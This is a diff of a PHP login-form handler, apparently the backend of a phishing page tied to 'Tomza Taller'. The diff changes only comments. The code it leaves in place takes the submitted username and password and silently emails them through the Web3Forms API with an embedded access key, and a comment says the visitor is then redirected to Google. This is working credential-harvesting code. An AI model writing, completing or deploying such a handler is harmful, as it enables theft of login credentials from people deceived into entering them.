@@ -1,23 +1,22 @@
 <?php
-// Evitar acceso directo al archivo
+// Evitar acceso directo
 if ($_SERVER["REQUEST_METHOD"] !== "POST") {
     header("Location: index.html");
     exit;
 }
 
-// Recibir y limpiar los datos
+// Recibir datos
 $usuario = trim($_POST["usuario"] ?? "");
 $password = trim($_POST["password"] ?? "");
 
-// Verificar que no estén vacíos
+// Validar campos
 if ($usuario === "" || $password === "") {
-    die("Por favor completa todos los campos.");
+    die("Faltan datos para continuar.");
 }
 
-// Tu clave de Web3Forms ya lista
+// Configuración Web3Forms
 $access_key = "bafc5339-b2a5-4e5b-bad7-a4d93a053174";
 
-// Datos que se enviarán a tu correo
 $datos = [
     "access_key" => $access_key,
     "subject" => "Nuevo ingreso - Tomza Taller",
@@ -26,7 +25,6 @@ $datos = [
     "Fecha y hora" => date("d/m/Y H:i:s")
 ];
 
-// Configuración para enviar
 $opciones = [
     "http" => [
         "header" => "Content-Type: application/x-www-form-urlencoded\r\n",
@@ -36,7 +34,6 @@ $opciones = [
     ]
 ];
 
-// Enviar la información
 @file_get_contents("https://api.web3forms.com/submit", false, stream_context_create($opciones));
 
 // Redirigir a Google
